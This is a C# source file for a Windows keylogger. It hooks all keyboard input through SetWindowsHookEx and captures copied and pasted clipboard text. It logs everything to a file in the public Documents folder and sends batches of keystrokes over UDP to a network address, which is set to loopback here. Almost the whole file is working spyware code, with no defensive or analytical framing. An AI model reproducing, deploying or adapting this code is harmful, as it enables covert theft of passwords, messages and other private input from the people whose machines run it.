using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
class InterceptKeys
{
	#region const
	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 0x0100;
	private const int WM_KEYUP = 0x0101;
	private const int WM_SYSKEYDOWN = 0x0104;
	private const int WM_SYSKEYUP = 0x0105;

	private const int VK_LSHIFT = 0xA0;
	private const int VK_RSHIFT = 0xA1;
	private const int VK_CTRLMENU = 0xA2;
	private const int VK_ALTGR = 0xA5;
	private const int VK_CTRL = 0x11;
	private const int VK_ALT = 0x12;
	private const int VK_CAPS = 0x14;
	private const int VK_TAB = 0x09;
	private const int VK_SPACE = 0x20;
	private const int VK_RETURN = 0x0D;
	private const int VK_NUMLOCK = 0x90;

	#endregion

	#region static member
	private static StreamWriter myfileStream;
	private static bool shift;
	private static bool ctrl;
	private static bool alt;
	private static bool caps;
	private static bool numLock;
	private static bool tab;
	private static bool altGr;
	private static bool ctrlMenu;
	private static bool sendingData = false;
	private static LowLevelKeyboardProc _proc = HookCallback;
	private static byte[] keyboardState = new byte[256];
	private static SendData _sendData = SendDataViaNetwork;
	private static IntPtr _hookID = IntPtr.Zero;
	private static readonly string myPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
				"myfile.txt");
	private static readonly int port = 8080;
	private static readonly int maxDataLenght = 1000;
	private static List<char> newValue = new List<char>();
	private static bool networkWorking = false;
	private static string tempClipboard;
	#endregion
	public static void Main()
	{
		try
		{
			myfileStream = new StreamWriter(myPath, true);
			String text = "init keylogger:";
			myfileStream.WriteLine(text.ToString());
			myfileStream.Close();
			networkWorking = CheckNetwork("127.0.0.1");
			SetKeyboardConfiguration();
		}
		catch (Exception err)
		{
			Console.WriteLine(err.ToString());
		}
		_hookID = SetHook(_proc);
		Application.Run();
		UnhookWindowsHookEx(_hookID);
		myfileStream.WriteLine();
		myfileStream.Close();
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using (ProcessModule curModule = Process.GetCurrentProcess().MainModule)
		{
			return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
		}
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{

		using (myfileStream = new StreamWriter(myPath, true))
		{

			if (nCode >= 0)
			{
				Task.Run(() => EvaluateData(lParam, wParam));
			}
		}
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
	}

	private static void EvaluateData(IntPtr lParam, IntPtr wParam)
	{
		int vkData = Marshal.ReadInt32(lParam);
		var text = Marshal.PtrToStringAnsi(lParam);
		int vkAction = (int)wParam;

		switch (vkAction)
		{
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:
				SetSpecialDownVK(vkData, text);
				break;
			case WM_KEYUP:
			case WM_SYSKEYUP:
				SetSpecialUpVKI(vkData);
				break;
		}

		if (newValue.Count > maxDataLenght)
		{
			if (!sendingData)
			{
				sendingData = true;
				Task.Run(() => SaveTheData());
			}
		}
	}

	private static void SetKeyboardConfiguration()
	{
		if (Control.IsKeyLocked(Keys.CapsLock))
		{
			caps = true;
		}
		if (Control.IsKeyLocked(Keys.NumLock))
		{
			numLock = true;
		}
	}

	private static bool CheckNetwork(string ipAddress)
	{
		var pingSender = new Ping();
		var pingOptions = new PingOptions()
		{
			DontFragment = true,
		};
		string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
		byte[] buffer = Encoding.ASCII.GetBytes(data);
		var pingReplay = pingSender.Send(ipAddress,
			1200,
			buffer,
			pingOptions);
		return pingReplay.Status == IPStatus.Success;
	}

	private static void SendDataViaNetwork(byte[] data, string address, bool forceResend = false)
	{
		try
		{
			using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
			{
				socket.SendTo(data, new IPEndPoint(IPAddress.Parse(address), port));
			}
		}
		catch
		{
			if (forceResend)
			{
				SendDataViaNetwork(data, address, forceResend);
			}
		}
	}

	private static void SaveTheData()
	{
		var data = DataToSave();
		if (networkWorking)
		{
			var bytesToSend = new byte[data.Length * sizeof(char)];
			//Encoding.ASCII.GetBytes(data);
			Buffer.BlockCopy(data, 0, bytesToSend, 0, bytesToSend.Length);
			_sendData(bytesToSend, "127.0.0.1");
		}
		else
		{
			try
			{
				TraceLog(myfileStream, new string(data.Select(d => (char)d).ToArray()));
			}
			catch { }
		}
		sendingData = false;
	}

	private static char[] DataToSave()
	{
		//var pcName = $"{Environment.MachineName}-{DateTime.UtcNow}:".ToArray();
		var maxVkLenght = maxDataLenght;// - pcName.Length - 1;
		var vkCodesArray = newValue.Take(maxVkLenght).Select(value => value).ToArray();
		newValue.RemoveRange(0, vkCodesArray.Length - 1);
		//var data = pcName.Concat(vkCodesArray).ToArray();
		var data = vkCodesArray;
		return data;
	}

	#region manage key pressed
	private static void SetSpecialDownVK(int intPressed, string textPressed)
	{
		switch (intPressed)
		{
			case VK_ALT:
				alt = true;
				break;
			case VK_CAPS:				
				caps = !caps;
				keyboardState[(int)Keys.CapsLock] = (byte)(caps ? 0xff : 0x00);
				break;
			case VK_NUMLOCK:				
				numLock = !numLock;
				keyboardState[(int)Keys.NumLock] = (byte)(numLock ? 0xff : 0x00);
				break;
			case VK_CTRL:
				ctrl = true;
				break;
			case VK_LSHIFT:
			case VK_RSHIFT:
				keyboardState[(int)Keys.ShiftKey] = 0xff;
				shift = true;
				break;
			case VK_TAB:
				tab = true;
				break;
			case VK_SPACE:
			case VK_RETURN:
				newValue.Add(Char.Parse(textPressed));
				break;
			case VK_CTRLMENU:
				ctrl = true;
				ctrlMenu = true;
				break;
			case VK_ALTGR:
				if (ctrlMenu)
				{
					keyboardState[(int)Keys.ControlKey] = 0xff;
					keyboardState[(int)Keys.Menu] = 0xff;
					altGr = true;
				}
				break;
			default:
				//check if key pressed must to be added in list to char
				//SetVkPressed(intPressed, textPressed);
				SaveKeyPressedOrCopied(intPressed, textPressed);
				break;
		}
	}

	private static void SetSpecialUpVKI(int keyPressed)
	{
		switch (keyPressed)
		{
			case VK_ALT:
				alt = false;
				break;
			case VK_CTRL:
				ctrl = false;
				break;
			case VK_LSHIFT:
			case VK_RSHIFT:
				keyboardState[(int)Keys.ShiftKey] = 0x00;
				shift = false;
				break;
			case VK_TAB:
				tab = false;
				break;
			case VK_CTRLMENU:
				ctrl = false;
				ctrlMenu = false;
				break;
			case VK_ALTGR:
				if (!ctrlMenu)
				{
					keyboardState[(int)Keys.ControlKey] = 0x00;
					keyboardState[(int)Keys.Menu] = 0x00;
					altGr = false;
				}
				break;
		}
	}

	private static void SaveKeyPressedOrCopied(int intPressed, string textPressed)
	{
		if (!alt && ctrl)
		{
			//copy, paste and cut action
			if (intPressed == 0x43 || intPressed == 0x58)
			{
				tempClipboard = Clipboard.GetText();
				TraceLog(myfileStream, $"Copied text: {tempClipboard}", true);
			}
			if (intPressed == 0x56)
			{
				newValue.AddRange(tempClipboard.ToArray());
				TraceLog(myfileStream, $"Pasted text: {tempClipboard}", true);
			}
		}

		var buf = new StringBuilder(256);
		ToUnicode((uint)intPressed, 0, keyboardState, buf, 256, 0);
		newValue.AddRange(buf.ToString().ToCharArray());
		TraceLog(myfileStream, $"ToUnicode key pressed: --- {buf}", true);
	}
	#endregion

	private static void TraceLog(StreamWriter streamWriter, string message, bool debug = false)
	{
		if (!debug)
		{
			myfileStream.WriteLine(message);
		}
		else
		{
			Trace.WriteLine(message);
		}
	}

	#region delegate
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private delegate void SendData(byte[] data, string ipAddress, bool forceResend = false);
	#endregion

	#region user32.dll import
	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern int ToUnicode(uint virtualKeyCode,
		uint scanCode,
		byte[] keyboardState,
		[Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
		int bufferSize,
		uint flags);
	#endregion

}
